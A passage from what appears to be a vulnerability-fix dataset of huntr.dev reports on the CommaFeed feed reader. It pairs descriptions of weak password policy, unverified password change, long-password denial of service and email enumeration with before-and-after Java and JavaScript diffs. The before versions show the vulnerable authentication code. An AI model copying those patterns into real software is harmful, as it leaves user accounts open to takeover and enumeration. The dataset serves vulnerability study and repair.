 private String password;


@@ -192,8 +192,7 @@ public Response getUserProfile(@ApiParam(hidden = true) @SecurityCheck User user
 @ApiOperation(value = ""Save user's profile"")
 @Timed
 public Response saveUserProfile(@ApiParam(hidden = true) @SecurityCheck User user,
   @ApiParam(required = true) ProfileModificationRequest request) {
  Preconditions.checkArgument(StringUtils.isBlank(request.getPassword()) || request.getPassword().length() >= 6);
  if (StringUtils.isNotBlank(request.getEmail())) {
   User u = userDAO.findByEmail(request.getEmail());
   Preconditions.checkArgument(u == null || user.getId().equals(u.getId()));

","5
pom.xml
@@ -409,6 +409,11 @@
    </exclusion>
   </exclusions>
  </dependency>
  <dependency>
   <groupId>org.passay</groupId>
   <artifactId>passay</artifactId>
   <version>1.6.1</version>
  </dependency>

  <dependency>
   <groupId>redis.clients</groupId>
10
src/main/java/com/commafeed/backend/service/UserService.java
@@ -92,19 +92,9 @@ public User register(String name, String password, String email, Collection<Role

 public User register(String name, String password, String email, Collection<Role> roles, boolean forceRegistration) {

  Preconditions.checkNotNull(name);
  Preconditions.checkArgument(StringUtils.length(name) <= 32, ""Name too long (32 characters maximum)"");
  Preconditions.checkNotNull(password);

  if (!forceRegistration) {
   Preconditions.checkState(config.getApplicationSettings().getAllowRegistrations(),
     ""Registrations are closed on this CommaFeed instance"");

   Preconditions.checkNotNull(email);
   Preconditions.checkArgument(StringUtils.length(name) >= 3, ""Name too short (3 characters minimum)"");
   Preconditions.checkArgument(forceRegistration || StringUtils.length(password) >= 6,
     ""Password too short (6 characters maximum)"");
   Preconditions.checkArgument(StringUtils.contains(email, ""@""), ""Invalid email address"");
  }

  Preconditions.checkArgument(userDAO.findByName(name) == null, ""Name already taken"");
54
src/main/java/com/commafeed/frontend/auth/PasswordConstraintValidator.java
@@ -0,0 +1,54 @@
package com.commafeed.frontend.auth;

import java.util.List;

import javax.validation.ConstraintValidator;
import javax.validation.ConstraintValidatorContext;

import org.passay.CharacterRule;
import org.passay.EnglishCharacterData;
import org.passay.LengthRule;
import org.passay.PasswordData;
import org.passay.PasswordValidator;
import org.passay.RuleResult;
import org.passay.WhitespaceRule;

public class PasswordConstraintValidator implements ConstraintValidator<ValidPassword, String> {

 @Override
 public void initialize(ValidPassword constraintAnnotation) {
  // nothing to do
 }

 @Override
 public boolean isValid(String value, ConstraintValidatorContext context) {
  PasswordValidator validator = buildPasswordValidator();
  RuleResult result = validator.validate(new PasswordData(value));

  if (result.isValid()) {
   return true;
  }

  List<String> messages = validator.getMessages(result);
  String message = String.join(System.lineSeparator(), messages);
  context.buildConstraintViolationWithTemplate(message).addConstraintViolation().disableDefaultConstraintViolation();
  return false;
 }

 private PasswordValidator buildPasswordValidator() {
  return new PasswordValidator(
    // length
    new LengthRule(8, 128),
    // 1 uppercase char
    new CharacterRule(EnglishCharacterData.UpperCase, 1),
    // 1 lowercase char
    new CharacterRule(EnglishCharacterData.LowerCase, 1),
    // 1 digit
    new CharacterRule(EnglishCharacterData.Digit, 1),
    // 1 special char
    new CharacterRule(EnglishCharacterData.Special, 1),
    // no whitespace
    new WhitespaceRule());
 }

}
23
src/main/java/com/commafeed/frontend/auth/ValidPassword.java
@@ -0,0 +1,23 @@
package com.commafeed.frontend.auth;

import java.lang.annotation.Documented;
import java.lang.annotation.ElementType;
import java.lang.annotation.Retention;
import java.lang.annotation.RetentionPolicy;
import java.lang.annotation.Target;

import javax.validation.Constraint;
import javax.validation.Payload;

@Documented
@Constraint(validatedBy = PasswordConstraintValidator.class)
@Target({ ElementType.TYPE, ElementType.FIELD, ElementType.ANNOTATION_TYPE })
@Retention(RetentionPolicy.RUNTIME)
public @interface ValidPassword {

 String message() default ""Invalid Password"";

 Class<?>[] groups() default {};

 Class<? extends Payload>[] payload() default {};
}
3
src/main/java/com/commafeed/frontend/model/request/ProfileModificationRequest.java
@@ -2,6 +2,8 @@

import java.io.Serializable;

import com.commafeed.frontend.auth.ValidPassword;

import io.swagger.annotations.ApiModel;
import io.swagger.annotations.ApiModelProperty;
import lombok.Data;
@@ -15,6 +17,7 @@ public class ProfileModificationRequest implements Serializable {
 private String email;

 @ApiModelProperty(value = ""changes password of the user, if specified"")
 @ValidPassword
 private String password;

 @ApiModelProperty(value = ""generate a new api key"")
4
src/main/java/com/commafeed/frontend/model/request/RegistrationRequest.java
@@ -6,6 +6,8 @@
import org.hibernate.validator.constraints.Length;
import org.hibernate.validator.constraints.NotEmpty;

import com.commafeed.frontend.auth.ValidPassword;

import io.swagger.annotations.ApiModel;
import io.swagger.annotations.ApiModelProperty;
import lombok.Data;
@@ -21,7 +23,7 @@ public class RegistrationRequest implements Serializable {
 private String name;

 @ApiModelProperty(value = ""password, minimum 6 characters"", required = true)
 @Length(min = 6)
 @ValidPassword
 @NotEmpty
 private String password;

3
src/main/java/com/commafeed/frontend/resource/UserREST.java
@@ -192,8 +192,7 @@ public Response getUserProfile(@ApiParam(hidden = true) @SecurityCheck User user
 @ApiOperation(value = ""Save user's profile"")
 @Timed
 public Response saveUserProfile(@ApiParam(hidden = true) @SecurityCheck User user,
   @ApiParam(required = true) ProfileModificationRequest request) {
  Preconditions.checkArgument(StringUtils.isBlank(request.getPassword()) || request.getPassword().length() >= 6);
   @Valid @ApiParam(required = true) ProfileModificationRequest request) {
  if (StringUtils.isNotBlank(request.getEmail())) {
   User u = userDAO.findByEmail(request.getEmail());
   Preconditions.checkArgument(u == null || user.getId().equals(u.getId()));"
https://huntr.dev/bounties/b52853ee-7482-4f59-84bb-ced371430fd1/,Allows large characters in password filling in athou/commafeed,"The commafeedapplication allows large characters to insert in the input field ""password"" which can allow attackers to cause a Denial of Service (DoS) via a crafted HTTP request.",,CWE-190: Integer Overflow or Wraparound,https://www.github.com/athou/commafeed/commit/899a8d746a7a7740c48e948c914e642de0712680,"@@ -409,6 +409,11 @@
    </exclusion>
   </exclusions>
  </dependency>






  <dependency>
   <groupId>redis.clients</groupId>

@@ -92,19 +92,9 @@ public User register(String name, String password, String email, Collection<Role

 public User register(String name, String password, String email, Collection<Role> roles, boolean forceRegistration) {

  Preconditions.checkNotNull(name);
  Preconditions.checkArgument(StringUtils.length(name) <= 32, ""Name too long (32 characters maximum)"");
  Preconditions.checkNotNull(password);

  if (!forceRegistration) {
   Preconditions.checkState(config.getApplicationSettings().getAllowRegistrations(),
     ""Registrations are closed on this CommaFeed instance"");

   Preconditions.checkNotNull(email);
   Preconditions.checkArgument(StringUtils.length(name) >= 3, ""Name too short (3 characters minimum)"");
   Preconditions.checkArgument(forceRegistration || StringUtils.length(password) >= 6,
     ""Password too short (6 characters maximum)"");
   Preconditions.checkArgument(StringUtils.contains(email, ""@""), ""Invalid email address"");
  }

  Preconditions.checkArgument(userDAO.findByName(name) == null, ""Name already taken"");

@@ -0,0 +1,54 @@






















































@@ -0,0 +1,23 @@























@@ -2,6 +2,8 @@

import java.io.Serializable;



import io.swagger.annotations.ApiModel;
import io.swagger.annotations.ApiModelProperty;
import lombok.Data;
@@ -15,6 +17,7 @@ public class ProfileModificationRequest implements Serializable {
 private String email;

 @ApiModelProperty(value = ""changes password of the user, if specified"")

 private String password;

 @ApiModelProperty(value = ""generate a new api key"")

@@ -6,6 +6,8 @@
import org.hibernate.validator.constraints.Length;
import org.hibernate.validator.constraints.NotEmpty;



import io.swagger.annotations.ApiModel;
import io.swagger.annotations.ApiModelProperty;
import lombok.Data;
@@ -21,7 +23,7 @@ public class RegistrationRequest implements Serializable {
 private String name;

 @ApiModelProperty(value = ""password, minimum 6 characters"", required = true)
 @Length(min = 6)
 @NotEmpty
 private String password;


@@ -192,8 +192,7 @@ public Response getUserProfile(@ApiParam(hidden = true) @SecurityCheck User user
 @ApiOperation(value = ""Save user's profile"")
 @Timed
 public Response saveUserProfile(@ApiParam(hidden = true) @SecurityCheck User user,
   @ApiParam(required = true) ProfileModificationRequest request) {
  Preconditions.checkArgument(StringUtils.isBlank(request.getPassword()) || request.getPassword().length() >= 6);
  if (StringUtils.isNotBlank(request.getEmail())) {
   User u = userDAO.findByEmail(request.getEmail());
   Preconditions.checkArgument(u == null || user.getId().equals(u.getId()));

","5
pom.xml
@@ -409,6 +409,11 @@
    </exclusion>
   </exclusions>
  </dependency>
  <dependency>
   <groupId>org.passay</groupId>
   <artifactId>passay</artifactId>
   <version>1.6.1</version>
  </dependency>

  <dependency>
   <groupId>redis.clients</groupId>
10
src/main/java/com/commafeed/backend/service/UserService.java
@@ -92,19 +92,9 @@ public User register(String name, String password, String email, Collection<Role

 public User register(String name, String password, String email, Collection<Role> roles, boolean forceRegistration) {

  Preconditions.checkNotNull(name);
  Preconditions.checkArgument(StringUtils.length(name) <= 32, ""Name too long (32 characters maximum)"");
  Preconditions.checkNotNull(password);

  if (!forceRegistration) {
   Preconditions.checkState(config.getApplicationSettings().getAllowRegistrations(),
     ""Registrations are closed on this CommaFeed instance"");

   Preconditions.checkNotNull(email);
   Preconditions.checkArgument(StringUtils.length(name) >= 3, ""Name too short (3 characters minimum)"");
   Preconditions.checkArgument(forceRegistration || StringUtils.length(password) >= 6,
     ""Password too short (6 characters maximum)"");
   Preconditions.checkArgument(StringUtils.contains(email, ""@""), ""Invalid email address"");
  }

  Preconditions.checkArgument(userDAO.findByName(name) == null, ""Name already taken"");
54
src/main/java/com/commafeed/frontend/auth/PasswordConstraintValidator.java
@@ -0,0 +1,54 @@
package com.commafeed.frontend.auth;

import java.util.List;

import javax.validation.ConstraintValidator;
import javax.validation.ConstraintValidatorContext;

import org.passay.CharacterRule;
import org.passay.EnglishCharacterData;
import org.passay.LengthRule;
import org.passay.PasswordData;
import org.passay.PasswordValidator;
import org.passay.RuleResult;
import org.passay.WhitespaceRule;

public class PasswordConstraintValidator implements ConstraintValidator<ValidPassword, String> {

 @Override
 public void initialize(ValidPassword constraintAnnotation) {
  // nothing to do
 }

 @Override
 public boolean isValid(String value, ConstraintValidatorContext context) {
  PasswordValidator validator = buildPasswordValidator();
  RuleResult result = validator.validate(new PasswordData(value));

  if (result.isValid()) {
   return true;
  }

  List<String> messages = validator.getMessages(result);
  String message = String.join(System.lineSeparator(), messages);
  context.buildConstraintViolationWithTemplate(message).addConstraintViolation().disableDefaultConstraintViolation();
  return false;
 }

 private PasswordValidator buildPasswordValidator() {
  return new PasswordValidator(
    // length
    new LengthRule(8, 128),
    // 1 uppercase char
    new CharacterRule(EnglishCharacterData.UpperCase, 1),
    // 1 lowercase char
    new CharacterRule(EnglishCharacterData.LowerCase, 1),
    // 1 digit
    new CharacterRule(EnglishCharacterData.Digit, 1),
    // 1 special char
    new CharacterRule(EnglishCharacterData.Special, 1),
    // no whitespace
    new WhitespaceRule());
 }

}
23
src/main/java/com/commafeed/frontend/auth/ValidPassword.java
@@ -0,0 +1,23 @@
package com.commafeed.frontend.auth;

import java.lang.annotation.Documented;
import java.lang.annotation.ElementType;
import java.lang.annotation.Retention;
import java.lang.annotation.RetentionPolicy;
import java.lang.annotation.Target;

import javax.validation.Constraint;
import javax.validation.Payload;

@Documented
@Constraint(validatedBy = PasswordConstraintValidator.class)
@Target({ ElementType.TYPE, ElementType.FIELD, ElementType.ANNOTATION_TYPE })
@Retention(RetentionPolicy.RUNTIME)
public @interface ValidPassword {

 String message() default ""Invalid Password"";

 Class<?>[] groups() default {};

 Class<? extends Payload>[] payload() default {};
}
3
src/main/java/com/commafeed/frontend/model/request/ProfileModificationRequest.java
@@ -2,6 +2,8 @@

import java.io.Serializable;

import com.commafeed.frontend.auth.ValidPassword;

import io.swagger.annotations.ApiModel;
import io.swagger.annotations.ApiModelProperty;
import lombok.Data;
@@ -15,6 +17,7 @@ public class ProfileModificationRequest implements Serializable {
 private String email;

 @ApiModelProperty(value = ""changes password of the user, if specified"")
 @ValidPassword
 private String password;

 @ApiModelProperty(value = ""generate a new api key"")
4
src/main/java/com/commafeed/frontend/model/request/RegistrationRequest.java
@@ -6,6 +6,8 @@
import org.hibernate.validator.constraints.Length;
import org.hibernate.validator.constraints.NotEmpty;

import com.commafeed.frontend.auth.ValidPassword;

import io.swagger.annotations.ApiModel;
import io.swagger.annotations.ApiModelProperty;
import lombok.Data;
@@ -21,7 +23,7 @@ public class RegistrationRequest implements Serializable {
 private String name;

 @ApiModelProperty(value = ""password, minimum 6 characters"", required = true)
 @Length(min = 6)
 @ValidPassword
 @NotEmpty
 private String password;

3
src/main/java/com/commafeed/frontend/resource/UserREST.java
@@ -192,8 +192,7 @@ public Response getUserProfile(@ApiParam(hidden = true) @SecurityCheck User user
 @ApiOperation(value = ""Save user's profile"")
 @Timed
 public Response saveUserProfile(@ApiParam(hidden = true) @SecurityCheck User user,
   @ApiParam(required = true) ProfileModificationRequest request) {
  Preconditions.checkArgument(StringUtils.isBlank(request.getPassword()) || request.getPassword().length() >= 6);
   @Valid @ApiParam(required = true) ProfileModificationRequest request) {
  if (StringUtils.isNotBlank(request.getEmail())) {
   User u = userDAO.findByEmail(request.getEmail());
   Preconditions.checkArgument(u == null || user.getId().equals(u.getId()));"
https://huntr.dev/bounties/debaf9bc-2e8a-4bf2-9625-de7104446300/,Weak Password Change Mechanism in athou/commafeed,"When setting a new user password, commafeeddoes not require knowledge of the original password or using another form of authentication.",,CWE-620: Unverified Password Change,https://www.github.com/athou/commafeed/commit/899a8d746a7a7740c48e948c914e642de0712680,"@@ -409,6 +409,11 @@
    </exclusion>
   </exclusions>
  </dependency>






  <dependency>
   <groupId>redis.clients</groupId>

@@ -92,19 +92,9 @@ public User register(String name, String password, String email, Collection<Role

 public User register(String name, String password, String email, Collection<Role> roles, boolean forceRegistration) {

  Preconditions.checkNotNull(name);
  Preconditions.checkArgument(StringUtils.length(name) <= 32, ""Name too long (32 characters maximum)"");
  Preconditions.checkNotNull(password);

  if (!forceRegistration) {
   Preconditions.checkState(config.getApplicationSettings().getAllowRegistrations(),
     ""Registrations are closed on this CommaFeed instance"");

   Preconditions.checkNotNull(email);
   Preconditions.checkArgument(StringUtils.length(name) >= 3, ""Name too short (3 characters minimum)"");
   Preconditions.checkArgument(forceRegistration || StringUtils.length(password) >= 6,
     ""Password too short (6 characters maximum)"");
   Preconditions.checkArgument(StringUtils.contains(email, ""@""), ""Invalid email address"");
  }

  Preconditions.checkArgument(userDAO.findByName(name) == null, ""Name already taken"");

@@ -0,0 +1,54 @@






















































@@ -0,0 +1,23 @@























@@ -2,6 +2,8 @@

import java.io.Serializable;



import io.swagger.annotations.ApiModel;
import io.swagger.annotations.ApiModelProperty;
import lombok.Data;
@@ -15,6 +17,7 @@ public class ProfileModificationRequest implements Serializable {
 private String email;

 @ApiModelProperty(value = ""changes password of the user, if specified"")

 private String password;

 @ApiModelProperty(value = ""generate a new api key"")

@@ -6,6 +6,8 @@
import org.hibernate.validator.constraints.Length;
import org.hibernate.validator.constraints.NotEmpty;



import io.swagger.annotations.ApiModel;
import io.swagger.annotations.ApiModelProperty;
import lombok.Data;
@@ -21,7 +23,7 @@ public class RegistrationRequest implements Serializable {
 private String name;

 @ApiModelProperty(value = ""password, minimum 6 characters"", required = true)
 @Length(min = 6)
 @NotEmpty
 private String password;


@@ -192,8 +192,7 @@ public Response getUserProfile(@ApiParam(hidden = true) @SecurityCheck User user
 @ApiOperation(value = ""Save user's profile"")
 @Timed
 public Response saveUserProfile(@ApiParam(hidden = true) @SecurityCheck User user,
   @ApiParam(required = true) ProfileModificationRequest request) {
  Preconditions.checkArgument(StringUtils.isBlank(request.getPassword()) || request.getPassword().length() >= 6);
  if (StringUtils.isNotBlank(request.getEmail())) {
   User u = userDAO.findByEmail(request.getEmail());
   Preconditions.checkArgument(u == null || user.getId().equals(u.getId()));

","5
pom.xml
@@ -409,6 +409,11 @@
    </exclusion>
   </exclusions>
  </dependency>
  <dependency>
   <groupId>org.passay</groupId>
   <artifactId>passay</artifactId>
   <version>1.6.1</version>
  </dependency>

  <dependency>
   <groupId>redis.clients</groupId>
10
src/main/java/com/commafeed/backend/service/UserService.java
@@ -92,19 +92,9 @@ public User register(String name, String password, String email, Collection<Role

 public User register(String name, String password, String email, Collection<Role> roles, boolean forceRegistration) {

  Preconditions.checkNotNull(name);
  Preconditions.checkArgument(StringUtils.length(name) <= 32, ""Name too long (32 characters maximum)"");
  Preconditions.checkNotNull(password);

  if (!forceRegistration) {
   Preconditions.checkState(config.getApplicationSettings().getAllowRegistrations(),
     ""Registrations are closed on this CommaFeed instance"");

   Preconditions.checkNotNull(email);
   Preconditions.checkArgument(StringUtils.length(name) >= 3, ""Name too short (3 characters minimum)"");
   Preconditions.checkArgument(forceRegistration || StringUtils.length(password) >= 6,
     ""Password too short (6 characters maximum)"");
   Preconditions.checkArgument(StringUtils.contains(email, ""@""), ""Invalid email address"");
  }

  Preconditions.checkArgument(userDAO.findByName(name) == null, ""Name already taken"");
54
src/main/java/com/commafeed/frontend/auth/PasswordConstraintValidator.java
@@ -0,0 +1,54 @@
package com.commafeed.frontend.auth;

import java.util.List;

import javax.validation.ConstraintValidator;
import javax.validation.ConstraintValidatorContext;

import org.passay.CharacterRule;
import org.passay.EnglishCharacterData;
import org.passay.LengthRule;
import org.passay.PasswordData;
import org.passay.PasswordValidator;
import org.passay.RuleResult;
import org.passay.WhitespaceRule;

public class PasswordConstraintValidator implements ConstraintValidator<ValidPassword, String> {

 @Override
 public void initialize(ValidPassword constraintAnnotation) {
  // nothing to do
 }

 @Override
 public boolean isValid(String value, ConstraintValidatorContext context) {
  PasswordValidator validator = buildPasswordValidator();
  RuleResult result = validator.validate(new PasswordData(value));

  if (result.isValid()) {
   return true;
  }

  List<String> messages = validator.getMessages(result);
  String message = String.join(System.lineSeparator(), messages);
  context.buildConstraintViolationWithTemplate(message).addConstraintViolation().disableDefaultConstraintViolation();
  return false;
 }

 private PasswordValidator buildPasswordValidator() {
  return new PasswordValidator(
    // length
    new LengthRule(8, 128),
    // 1 uppercase char
    new CharacterRule(EnglishCharacterData.UpperCase, 1),
    // 1 lowercase char
    new CharacterRule(EnglishCharacterData.LowerCase, 1),
    // 1 digit
    new CharacterRule(EnglishCharacterData.Digit, 1),
    // 1 special char
    new CharacterRule(EnglishCharacterData.Special, 1),
    // no whitespace
    new WhitespaceRule());
 }

}
23
src/main/java/com/commafeed/frontend/auth/ValidPassword.java
@@ -0,0 +1,23 @@
package com.commafeed.frontend.auth;

import java.lang.annotation.Documented;
import java.lang.annotation.ElementType;
import java.lang.annotation.Retention;
import java.lang.annotation.RetentionPolicy;
import java.lang.annotation.Target;

import javax.validation.Constraint;
import javax.validation.Payload;

@Documented
@Constraint(validatedBy = PasswordConstraintValidator.class)
@Target({ ElementType.TYPE, ElementType.FIELD, ElementType.ANNOTATION_TYPE })
@Retention(RetentionPolicy.RUNTIME)
public @interface ValidPassword {

 String message() default ""Invalid Password"";

 Class<?>[] groups() default {};

 Class<? extends Payload>[] payload() default {};
}
3
src/main/java/com/commafeed/frontend/model/request/ProfileModificationRequest.java
@@ -2,6 +2,8 @@

import java.io.Serializable;

import com.commafeed.frontend.auth.ValidPassword;

import io.swagger.annotations.ApiModel;
import io.swagger.annotations.ApiModelProperty;
import lombok.Data;
@@ -15,6 +17,7 @@ public class ProfileModificationRequest implements Serializable {
 private String email;

 @ApiModelProperty(value = ""changes password of the user, if specified"")
 @ValidPassword
 private String password;

 @ApiModelProperty(value = ""generate a new api key"")
4
src/main/java/com/commafeed/frontend/model/request/RegistrationRequest.java
@@ -6,6 +6,8 @@
import org.hibernate.validator.constraints.Length;
import org.hibernate.validator.constraints.NotEmpty;

import com.commafeed.frontend.auth.ValidPassword;

import io.swagger.annotations.ApiModel;
import io.swagger.annotations.ApiModelProperty;
import lombok.Data;
@@ -21,7 +23,7 @@ public class RegistrationRequest implements Serializable {
 private String name;

 @ApiModelProperty(value = ""password, minimum 6 characters"", required = true)
 @Length(min = 6)
 @ValidPassword
 @NotEmpty
 private String password;

3
src/main/java/com/commafeed/frontend/resource/UserREST.java
@@ -192,8 +192,7 @@ public Response getUserProfile(@ApiParam(hidden = true) @SecurityCheck User user
 @ApiOperation(value = ""Save user's profile"")
 @Timed
 public Response saveUserProfile(@ApiParam(hidden = true) @SecurityCheck User user,
   @ApiParam(required = true) ProfileModificationRequest request) {
  Preconditions.checkArgument(StringUtils.isBlank(request.getPassword()) || request.getPassword().length() >= 6);
   @Valid @ApiParam(required = true) ProfileModificationRequest request) {
  if (StringUtils.isNotBlank(request.getEmail())) {
   User u = userDAO.findByEmail(request.getEmail());
   Preconditions.checkArgument(u == null || user.getId().equals(u.getId()));"
https://huntr.dev/bounties/afa5e817-ee1f-43e7-8bcb-727ad429df74/,Weak Password Policy in athou/commafeed,"This application commafeed is using a weak password policy. Acunetix was able to guess the credentials required to access this page. A weak password is short, common, a system default, or something that could be rapidly guessed by executing a brute force attack using a subset of all possible passwords, such as words in the dictionary, proper names, words based on the user name or common variations on these themes.",,CWE-521: Weak Password Requirements,https://www.github.com/athou/commafeed/commit/899a8d746a7a7740c48e948c914e642de0712680,"@@ -409,6 +409,11 @@
    </exclusion>
   </exclusions>
  </dependency>






  <dependency>
   <groupId>redis.clients</groupId>

@@ -92,19 +92,9 @@ public User register(String name, String password, String email, Collection<Role

 public User register(String name, String password, String email, Collection<Role> roles, boolean forceRegistration) {

  Preconditions.checkNotNull(name);
  Preconditions.checkArgument(StringUtils.length(name) <= 32, ""Name too long (32 characters maximum)"");
  Preconditions.checkNotNull(password);

  if (!forceRegistration) {
   Preconditions.checkState(config.getApplicationSettings().getAllowRegistrations(),
     ""Registrations are closed on this CommaFeed instance"");

   Preconditions.checkNotNull(email);
   Preconditions.checkArgument(StringUtils.length(name) >= 3, ""Name too short (3 characters minimum)"");
   Preconditions.checkArgument(forceRegistration || StringUtils.length(password) >= 6,
     ""Password too short (6 characters maximum)"");
   Preconditions.checkArgument(StringUtils.contains(email, ""@""), ""Invalid email address"");
  }

  Preconditions.checkArgument(userDAO.findByName(name) == null, ""Name already taken"");

@@ -0,0 +1,54 @@






















































@@ -0,0 +1,23 @@























@@ -2,6 +2,8 @@

import java.io.Serializable;



import io.swagger.annotations.ApiModel;
import io.swagger.annotations.ApiModelProperty;
import lombok.Data;
@@ -15,6 +17,7 @@ public class ProfileModificationRequest implements Serializable {
 private String email;

 @ApiModelProperty(value = ""changes password of the user, if specified"")

 private String password;

 @ApiModelProperty(value = ""generate a new api key"")

@@ -6,6 +6,8 @@
import org.hibernate.validator.constraints.Length;
import org.hibernate.validator.constraints.NotEmpty;



import io.swagger.annotations.ApiModel;
import io.swagger.annotations.ApiModelProperty;
import lombok.Data;
@@ -21,7 +23,7 @@ public class RegistrationRequest implements Serializable {
 private String name;

 @ApiModelProperty(value = ""password, minimum 6 characters"", required = true)
 @Length(min = 6)
 @NotEmpty
 private String password;


@@ -192,8 +192,7 @@ public Response getUserProfile(@ApiParam(hidden = true) @SecurityCheck User user
 @ApiOperation(value = ""Save user's profile"")
 @Timed
 public Response saveUserProfile(@ApiParam(hidden = true) @SecurityCheck User user,
   @ApiParam(required = true) ProfileModificationRequest request) {
  Preconditions.checkArgument(StringUtils.isBlank(request.getPassword()) || request.getPassword().length() >= 6);
  if (StringUtils.isNotBlank(request.getEmail())) {
   User u = userDAO.findByEmail(request.getEmail());
   Preconditions.checkArgument(u == null || user.getId().equals(u.getId()));

","5
pom.xml
@@ -409,6 +409,11 @@
    </exclusion>
   </exclusions>
  </dependency>
  <dependency>
   <groupId>org.passay</groupId>
   <artifactId>passay</artifactId>
   <version>1.6.1</version>
  </dependency>

  <dependency>
   <groupId>redis.clients</groupId>
10
src/main/java/com/commafeed/backend/service/UserService.java
@@ -92,19 +92,9 @@ public User register(String name, String password, String email, Collection<Role

 public User register(String name, String password, String email, Collection<Role> roles, boolean forceRegistration) {

  Preconditions.checkNotNull(name);
  Preconditions.checkArgument(StringUtils.length(name) <= 32, ""Name too long (32 characters maximum)"");
  Preconditions.checkNotNull(password);

  if (!forceRegistration) {
   Preconditions.checkState(config.getApplicationSettings().getAllowRegistrations(),
     ""Registrations are closed on this CommaFeed instance"");

   Preconditions.checkNotNull(email);
   Preconditions.checkArgument(StringUtils.length(name) >= 3, ""Name too short (3 characters minimum)"");
   Preconditions.checkArgument(forceRegistration || StringUtils.length(password) >= 6,
     ""Password too short (6 characters maximum)"");
   Preconditions.checkArgument(StringUtils.contains(email, ""@""), ""Invalid email address"");
  }

  Preconditions.checkArgument(userDAO.findByName(name) == null, ""Name already taken"");
54
src/main/java/com/commafeed/frontend/auth/PasswordConstraintValidator.java
@@ -0,0 +1,54 @@
package com.commafeed.frontend.auth;

import java.util.List;

import javax.validation.ConstraintValidator;
import javax.validation.ConstraintValidatorContext;

import org.passay.CharacterRule;
import org.passay.EnglishCharacterData;
import org.passay.LengthRule;
import org.passay.PasswordData;
import org.passay.PasswordValidator;
import org.passay.RuleResult;
import org.passay.WhitespaceRule;

public class PasswordConstraintValidator implements ConstraintValidator<ValidPassword, String> {

 @Override
 public void initialize(ValidPassword constraintAnnotation) {
  // nothing to do
 }

 @Override
 public boolean isValid(String value, ConstraintValidatorContext context) {
  PasswordValidator validator = buildPasswordValidator();
  RuleResult result = validator.validate(new PasswordData(value));

  if (result.isValid()) {
   return true;
  }

  List<String> messages = validator.getMessages(result);
  String message = String.join(System.lineSeparator(), messages);
  context.buildConstraintViolationWithTemplate(message).addConstraintViolation().disableDefaultConstraintViolation();
  return false;
 }

 private PasswordValidator buildPasswordValidator() {
  return new PasswordValidator(
    // length
    new LengthRule(8, 128),
    // 1 uppercase char
    new CharacterRule(EnglishCharacterData.UpperCase, 1),
    // 1 lowercase char
    new CharacterRule(EnglishCharacterData.LowerCase, 1),
    // 1 digit
    new CharacterRule(EnglishCharacterData.Digit, 1),
    // 1 special char
    new CharacterRule(EnglishCharacterData.Special, 1),
    // no whitespace
    new WhitespaceRule());
 }

}
23
src/main/java/com/commafeed/frontend/auth/ValidPassword.java
@@ -0,0 +1,23 @@
package com.commafeed.frontend.auth;

import java.lang.annotation.Documented;
import java.lang.annotation.ElementType;
import java.lang.annotation.Retention;
import java.lang.annotation.RetentionPolicy;
import java.lang.annotation.Target;

import javax.validation.Constraint;
import javax.validation.Payload;

@Documented
@Constraint(validatedBy = PasswordConstraintValidator.class)
@Target({ ElementType.TYPE, ElementType.FIELD, ElementType.ANNOTATION_TYPE })
@Retention(RetentionPolicy.RUNTIME)
public @interface ValidPassword {

 String message() default ""Invalid Password"";

 Class<?>[] groups() default {};

 Class<? extends Payload>[] payload() default {};
}
3
src/main/java/com/commafeed/frontend/model/request/ProfileModificationRequest.java
@@ -2,6 +2,8 @@

import java.io.Serializable;

import com.commafeed.frontend.auth.ValidPassword;

import io.swagger.annotations.ApiModel;
import io.swagger.annotations.ApiModelProperty;
import lombok.Data;
@@ -15,6 +17,7 @@ public class ProfileModificationRequest implements Serializable {
 private String email;

 @ApiModelProperty(value = ""changes password of the user, if specified"")
 @ValidPassword
 private String password;

 @ApiModelProperty(value = ""generate a new api key"")
4
src/main/java/com/commafeed/frontend/model/request/RegistrationRequest.java
@@ -6,6 +6,8 @@
import org.hibernate.validator.constraints.Length;
import org.hibernate.validator.constraints.NotEmpty;

import com.commafeed.frontend.auth.ValidPassword;

import io.swagger.annotations.ApiModel;
import io.swagger.annotations.ApiModelProperty;
import lombok.Data;
@@ -21,7 +23,7 @@ public class RegistrationRequest implements Serializable {
 private String name;

 @ApiModelProperty(value = ""password, minimum 6 characters"", required = true)
 @Length(min = 6)
 @ValidPassword
 @NotEmpty
 private String password;

3
src/main/java/com/commafeed/frontend/resource/UserREST.java
@@ -192,8 +192,7 @@ public Response getUserProfile(@ApiParam(hidden = true) @SecurityCheck User user
 @ApiOperation(value = ""Save user's profile"")
 @Timed
 public Response saveUserProfile(@ApiParam(hidden = true) @SecurityCheck User user,
   @ApiParam(required = true) ProfileModificationRequest request) {
  Preconditions.checkArgument(StringUtils.isBlank(request.getPassword()) || request.getPassword().length() >= 6);
   @Valid @ApiParam(required = true) ProfileModificationRequest request) {
  if (StringUtils.isNotBlank(request.getEmail())) {
   User u = userDAO.findByEmail(request.getEmail());
   Preconditions.checkArgument(u == null || user.getId().equals(u.getId()));"
https://huntr.dev/bounties/e4c23ec0-590f-4f09-987a-cb408f0755d4/,Password Reset Allows For User Email Enumeration in athou/commafeed,"The password reset function at the login page responds to valid and invalid emails in the application. Submitting an invalid email result in ""The e-mail address is not assigned to any user account."" A valid response results in a message stating an email has been sent.",,CWE-204: Observable Response Discrepancy,https://www.github.com/athou/commafeed/commit/9bbfc2de3f43b192be020a87094fca11b3ff5daf,"@@ -1683,7 +1683,7 @@ module.controller(""LoginCtrl"", [
        }

        var recovery_success = function (data) {
            $scope.recovery_message = ""Email has ben sent. Check your inbox.""
        }
        var recovery_error = function (data) {
            $scope.recovery_message = data.data

@@ -259,8 +259,9 @@ public Response login(@ApiParam(required = true) LoginRequest req, @ApiParam(hid
 public Response sendPasswordReset(@Valid @ApiParam(required = true) PasswordResetRequest req) {
  User user = userDAO.findByEmail(req.getEmail());
  if (user == null) {
   return Response.status(Status.PRECONDITION_FAILED).entity(""Email not found."").type(MediaType.TEXT_PLAIN).build();
  }

  try {
   user.setRecoverPasswordToken(DigestUtils.sha1Hex(UUID.randomUUID().toString()));
   user.setRecoverPasswordTokenDate(new Date());

","2
src/main/app/js/controllers.js
@@ -1683,7 +1683,7 @@ module.controller(""LoginCtrl"", [
        }

        var recovery_success = function (data) {
            $scope.recovery_message = ""Email has ben sent. Check your inbox.""
            $scope.recovery_message = ""An email has been sent if this address was registered. Check your inbox.""
        }
        var recovery_error = function (data) {
            $scope.recovery_message = data.data
3
src/main/java/com/commafeed/frontend/resource/UserREST.java
@@ -259,8 +259,9 @@ public Response login(@ApiParam(required = true) LoginRequest req, @ApiParam(hid
